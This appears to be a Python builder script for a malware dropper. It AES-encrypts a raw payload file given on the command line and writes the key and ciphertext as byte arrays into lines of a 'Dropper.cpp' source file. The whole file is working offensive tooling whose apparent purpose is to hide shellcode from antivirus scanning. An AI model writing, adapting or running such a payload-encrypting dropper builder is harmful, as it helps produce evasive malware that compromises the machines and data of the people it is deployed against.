import sys
from Cryptodome.Cipher import AES
from os import urandom
import hashlib

KEY = urandom(16)

def pad(s):
    pad_length = AES.block_size - len(s) % AES.block_size
    padding = bytes([pad_length] * pad_length)
    return s + padding

def aesenc(plaintext, key):
    k = hashlib.sha256(key).digest()
    iv = bytes([0] * 16)  # Create a bytes object of 16 null bytes
    plaintext = pad(plaintext)
    cipher = AES.new(k, AES.MODE_CBC, iv)

    return cipher.encrypt(plaintext)

try:
    plaintext = open(sys.argv[1], "rb").read()
except:
    print("File argument needed! %s <raw payload file>" % sys.argv[0])
    sys.exit()

ciphertext = aesenc(plaintext, KEY)

with open('Dropper.cpp', 'r') as file:
    lines = file.readlines()

if len(lines) > 6:
    lines[5] = 'char AESkey[] = { ' + ', '.join('0x{:02x}'.format(x) for x in KEY) + ' };\n'
    lines[6] = 'std::vector<BYTE> payload = { ' + ', '.join('0x{:02x}'.format(x) for x in ciphertext) + ' };\n'

with open('Dropper.cpp', 'w') as file:
    file.writelines(lines)

print('char key[] = { ' + ', '.join('0x{:02x}'.format(x) for x in KEY) + ' };')
print('std::vector<BYTE> payload = { ' + ', '.join('0x{:02x}'.format(x) for x in ciphertext) + ' };')
